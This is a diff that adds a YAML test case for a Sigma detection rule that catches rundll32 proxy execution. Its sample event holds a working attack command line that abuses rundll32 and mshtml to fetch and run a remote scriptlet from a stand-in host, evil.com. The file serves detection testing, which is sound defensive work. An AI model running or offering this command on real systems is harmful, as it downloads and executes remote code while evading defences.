@@ -1,0 +1,19 @@
+test_case:
+  name: "Rundll32 Proxy Execution"
+  description: "Tests detection of rundll32 abuse for proxy execution"
+  rule: "defense_evasion/rundll32_abuse.yml"
+  rule_type: sigma
+  events:
+    - type: process_create
+      os_type: windows
+      data:
+        path: "C:\\Windows\\System32\\rundll32.exe"
+        cmdline: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/payload.sct\")"
+        parent_path: "C:\\Windows\\explorer.exe"
+        user: "WORKSTATION\\user"
+        pid: 4568
+        ppid: 1892
+  expected: match
+  expected_severity: high
+  expected_mitre: ["T1218.011"]
+  tags: ["defense_evasion", "rundll32", "positive"]
